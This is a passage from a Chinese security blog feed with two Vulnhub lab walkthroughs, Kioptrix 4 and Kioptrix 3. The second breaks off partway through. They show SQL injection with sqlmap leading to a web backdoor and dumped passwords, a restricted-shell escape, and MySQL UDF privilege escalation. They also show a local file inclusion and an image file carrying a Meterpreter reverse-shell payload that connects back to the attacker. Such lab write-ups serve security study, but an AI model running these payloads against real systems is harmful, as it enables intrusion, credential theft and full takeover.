negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 10.32.58.187</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds</span><br></pre></td></tr></table></figure><p>从扫描结果可以得到，开发以下端口信息</p><ul><li>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li><li>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li><li>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</li><li>445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</li></ul><p>访问80端口下的WEB服务。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_1.png" alt=""></p><p>尝试万能密码绕过<code>&#39;or 1=1#</code> 绕过失败。</p><p>弱密码<code>admin:admin</code>也是错误的。</p><p>尝试<code>admin:&#39;</code>，出现报错。好爆出来了路径<code>/var/www/checklogin.php</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_2.png" alt=""></p><p>存在POST型注入。</p><h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="sqlmap进行sql注入">sqlmap进行SQL注入</span></h3><p><code>sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --current-user --current-db --is-dba</code></p><p>在注入的过程会遇到<code>302跳转</code>选择<code>n</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:00:45] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">[02:00:45] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[02:00:45] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[02:00:45] [INFO] fetching current database</span><br><span class="line">[02:00:45] [INFO] retrieved: members</span><br><span class="line">current database:    &apos;members&apos;</span><br><span class="line">[02:00:45] [INFO] testing if current user is DBA</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">current user is DBA:    True</span><br><span class="line">[02:00:45] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/10.32.58.187&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 02:00:45</span><br></pre></td></tr></table></figure><p>通过注入得到用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| id | username | password              |</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| 1  | john     | MyNameIsJohn          |</span><br><span class="line">| 2  | robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="line">+----+----------+-----------------------+</span><br></pre></td></tr></table></figure><p>通过<code>--os-shell</code>写入一个<code>webshell</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&apos;]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 02:09:06</span><br><span class="line"></span><br><span class="line">[02:09:06] [INFO] resuming back-end DBMS &apos;mysql&apos; </span><br><span class="line">[02:09:06] [INFO] testing connection to the target URL</span><br><span class="line">[02:09:06] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:09:06] [INFO] going to use a web backdoor for command prompt</span><br><span class="line">[02:09:06] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line">&gt; 4</span><br><span class="line">[02:09:08] [INFO] retrieved the web server document root: &apos;/var/www&apos;</span><br><span class="line">[02:09:08] [INFO] retrieved web server absolute paths: &apos;/var/www/checklogin.php&apos;</span><br><span class="line">[02:09:08] [INFO] trying to upload the file stager on &apos;/var/www/&apos; via LIMIT &apos;LINES TERMINATED BY&apos; method</span><br><span class="line">[02:09:08] [INFO] the file stager has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpuadle.php</span><br><span class="line">[02:09:08] [WARNING] unable to upload the file through the web file stager to &apos;/var/www/&apos;</span><br><span class="line">[02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span><br><span class="line">do you want to try the same method used for the file stager? [Y/n] </span><br><span class="line">[02:09:09] [INFO] the backdoor has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpbcphh.php</span><br><span class="line">[02:09:09] [INFO] calling OS shell. To quit type &apos;x&apos; or &apos;q&apos; and press ENTER</span><br><span class="line">os-shell&gt; id</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;uid=33(www-data) gid=33(www-data) groups=33(www-data)&apos;</span><br><span class="line">os-shell&gt; whoami</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;www-data&apos;</span><br><span class="line">os-shell&gt; cat checklogin.php</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$host=&quot;localhost&quot;; // Host name</span><br><span class="line">$username=&quot;root&quot;; // Mysql username</span><br><span class="line">$password=&quot;&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;members&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br></pre></td></tr></table></figure><p>但是权限很小。但是得到了数据库的账号密码。</p><h3><span id="通过ssh连接">通过SSH连接</span></h3><p>利用SQL注入得到的用户名密码SSH登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh john@10.32.58.187</span><br><span class="line">The authenticity of host &apos;10.32.58.187 (10.32.58.187)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.32.58.187&apos; (RSA) to the list of known hosts.</span><br><span class="line">john@10.32.58.187&apos;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">john:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="line">john:~$ help help</span><br><span class="line">Limited Shell (lshell) limited help.</span><br><span class="line">Cheers.</span><br></pre></td></tr></table></figure><p>从这里我们可以利用的命令有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br></pre></td></tr></table></figure><p>重点其中有一个是<code>echo</code>。</p><p>我们可以利用他得到一个<code>bash交互shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john:~$ echo os.system(&apos;/bin/bash&apos;)     </span><br><span class="line">john@Kioptrix4:~$ id</span><br><span class="line">uid=1001(john) gid=1001(john) groups=1001(john)</span><br></pre></td></tr></table></figure><p>权限还是当前用户的权限。</p><h3><span id="mysql数据库提权">MySQL数据库提权</span></h3><p>利用SQL注入得到的数据库账号密码登录MySQL数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3520</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; status;</span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2</span><br><span class="line"></span><br><span class="line">Connection id:3520</span><br><span class="line">Current database:</span><br><span class="line">Current user:root@localhost</span><br><span class="line">SSL:Not in use</span><br><span class="line">Current pager:stdout</span><br><span class="line">Using outfile:&apos;&apos;</span><br><span class="line">Using delimiter:;</span><br><span class="line">Server version:5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line">Protocol version:10</span><br><span class="line">Connection:Localhost via UNIX socket</span><br><span class="line">Server characterset:latin1</span><br><span class="line">Db     characterset:latin1</span><br><span class="line">Client characterset:latin1</span><br><span class="line">Conn.  characterset:latin1</span><br><span class="line">UNIX socket:/var/run/mysqld/mysqld.sock</span><br><span class="line">Uptime:1 hour 10 min 47 sec</span><br></pre></td></tr></table></figure><p>尝试<code>mysql udf 提权</code>。</p><p>在Windows环境下，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line">CREATE TABLE npn(line blob);</span><br><span class="line">INSERT INTO npn values(load_file(&apos;C://xampplite//htdocs//mail//lib_mysqludf_sys.dll&apos;));</span><br><span class="line">SELECT * FROM mysql.npn INTO DUMPFILE &apos;c://windows//system32//lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS integer SONAME &apos;lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">SELECT sys_exec(&quot;net user npn npn12345678 /add&quot;);</span><br><span class="line">SELECT sys_exec(&quot;net localgroup Administrators npn /add&quot;);</span><br></pre></td></tr></table></figure></p><p>实现提权。</p><p>我们在实验环境下进行Linux环境下的UDF提权操作。</p><p>首先找到<code>lib_mysqludf_sys.so</code>的目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function sys_exec returns integer soname &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">ERROR 1125 (HY000): Function &apos;sys_exec&apos; already exists</span><br><span class="line">mysql&gt; select sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| NULL                                                | </span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ cat /tmp/out</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p>这样就将<code>sys_exec()</code>函数执行的结果写入到了<code>/tmp/out</code>下。</p><p>得知可以得到root权限。</p><p>可以写一个c语言程序进行命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(“/bin/bash”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地编译上传到目标靶机。</p><p>这里我用wget下载好像一下连接超时。可能是防火墙阻止流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin&apos;);</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin john&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(&apos;usermod -a -G admin john&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure><p>利用<code>SELECT sys_exec(&#39;usermod -a -G admin&#39;);</code>将<code>john</code>加入管理员组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/tmp$ sudo su</span><br><span class="line">[sudo] password for john: </span><br><span class="line">root@Kioptrix4:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/tmp# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>这样我们得到了root权限。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h3&gt;&lt;span id=&quot;信息收集&quot;&gt;信息收集&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;用&lt;code&gt;nmap&lt;/code&gt;进行端口扫描。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 3</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-3.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-3.html</id>
    <published>2018-05-08T12:01:26.000Z</published>
    <updated>2019-01-07T08:24:19.694Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="信息收集">信息收集</span></h2><p>同样用<code>netdiscover</code>发现目标主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.194.0/16   |   Screen View: Unique Hosts          </span><br><span class="line">                                                                               </span><br><span class="line"> 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780              </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      6     360  Xiaomi Communications Co Ltd</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      2     120  Intel Corporate             </span><br><span class="line"> 192.168.43.58   00:0c:29:b2:76:40      4     240  VMware, Inc.                </span><br><span class="line"> 192.168.43.158  00:0c:29:38:2d:6f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><p>目标IP为<code>192.168.43.158</code>。</p><p>用nmap扫描目标主机端口信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS -n 192.168.43.158</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT</span><br><span class="line">Nmap scan report for 192.168.43.158</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.53 ms 192.168.43.158</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds</span><br></pre></td></tr></table></figure><p>由扫描信息可以得到</p><ul><li>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li><li>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li><li>OS details: Linux 2.6.9 - 2.6.33</li></ul><p>80端口可以看出cms为<code>Lotus CMS</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_4.png" alt=""></p><p>用<code>dirb</code>扫描一下网站目录。也可以用御剑扫描目录。发现存在<code>phpdamin</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_5.png" alt=""></p><p>cms后台<code>http://192.168.43.158/index.php?system=Admin</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p><h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="文件包含amp后台上传">文件包含&amp;后台上传</span></h3><p>访问80端口上的WEB服务。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_1.png" alt=""></p><p>发现url中有点问题</p><p><code>http://192.168.43.158/index.php?system=Blog</code></p><p>尝试<code>system=../../../../../etc/passwd</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_2.png" alt=""></p><p>好像不行，尝试<code>%00.</code>截断，发现可以读到<code>/etc/passwd</code></p><p><code>http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_3.png" alt=""></p><p>这里可以结合后面SQLmap跑出来的后台密码得到了一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw &gt; /tmp/evil.jpg</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">No Arch selected, selecting Arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure><p>用<code>msfvenom</code>生成一个图片马</p><p>我们在后台上传图片的地方上传一个图片</p><p>修改已有的图片，并得到图片的名，</p><p>利用msf监听端口</p><p>利用文件包含，包含上传图片，这个地方比较鸡肋。因为这个绝对路径我们是得不到的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/thumb_1a2o44437j.jpg%00.</span><br></pre></td></tr></table></figure><p>访问返回一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 